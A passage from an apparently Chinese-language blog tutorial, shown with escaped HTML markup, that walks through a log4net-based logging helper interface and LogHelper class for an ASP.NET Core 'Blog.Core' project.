        &lt;span&gt;void&lt;/span&gt; Warn(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 警告信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Warn(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 错误信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Error(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 错误信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Error(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 失败信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Fatal(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception);
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 失败信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt; Fatal(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception);
    }

}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;1、在 Log 文件夹下新建 LogHelper.cs&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;93&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; Blog.Core.Log
{
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;日志帮助实现类&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; LogHelper : ILoggerHelper
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; ConcurrentDictionary&amp;lt;Type, ILog&amp;gt; Loggers = &lt;span&gt;new&lt;/span&gt; ConcurrentDictionary&amp;lt;Type, ILog&amp;gt;&lt;span&gt;();

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 获取记录器
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;soruce&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt;&lt;span&gt; ILog GetLogger(Type source)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (Loggers.ContainsKey(source))
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Loggers[source];
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                ILog logger &lt;/span&gt;=&lt;span&gt; LogManager.GetLogger(Startup.repository.Name, source);
                Loggers.TryAdd(source, logger);
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; logger;
            }
        }

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Log a message object &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 调试信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Debug(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; message)
        {
            Debug(source.GetType(), message);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 调试信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;ps&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ps&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Debug(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;string&lt;/span&gt; message, &lt;span&gt;params&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;&lt;span&gt;[] ps)
        {
            Debug(source.GetType(), &lt;/span&gt;&lt;span&gt;string&lt;/span&gt;&lt;span&gt;.Format(message, ps));
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 调试信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Debug(Type source, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; message)
        {
            ILog logger &lt;/span&gt;=&lt;span&gt; GetLogger(source);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (logger.IsDebugEnabled)
            {
                logger.Debug(message);
            }
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 关键信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Info(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message)
        {
            Info(source.GetType(), message);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 关键信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Info(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message)
        {
            ILog logger &lt;/span&gt;=&lt;span&gt; GetLogger(source);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (logger.IsInfoEnabled)
            {
                logger.Info(message);
            }
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 警告信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Warn(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message)
        {
            Warn(source.GetType(), message);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 警告信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Warn(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message)
        {
            ILog logger &lt;/span&gt;=&lt;span&gt; GetLogger(source);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (logger.IsWarnEnabled)
            {
                logger.Warn(message);
            }
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 错误信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Error(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message)
        {
            Error(source.GetType(), message);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 错误信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Error(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message)
        {
            ILog logger &lt;/span&gt;=&lt;span&gt; GetLogger(source);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (logger.IsErrorEnabled)
            {
                logger.Error(message);
            }
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 失败信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Fatal(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message)
        {
            Fatal(source.GetType(), message);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 失败信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Fatal(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message)
        {
            ILog logger &lt;/span&gt;=&lt;span&gt; GetLogger(source);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (logger.IsFatalEnabled)
            {
                logger.Fatal(message);
            }
        }
        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Log a message object and exception &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;

        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 调试信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Debug(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception)
        {
            Debug(source.GetType(), message, exception);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 调试信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Debug(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception)
        {
            GetLogger(source).Debug(message, exception);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 关键信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Info(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception)
        {
            Info(source.GetType(), message, exception);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 关键信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Info(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception)
        {
            GetLogger(source).Info(message, exception);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 警告信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Warn(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception)
        {
            Warn(source.GetType(), message, exception);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 警告信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Warn(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception)
        {
            GetLogger(source).Warn(message, exception);
        }
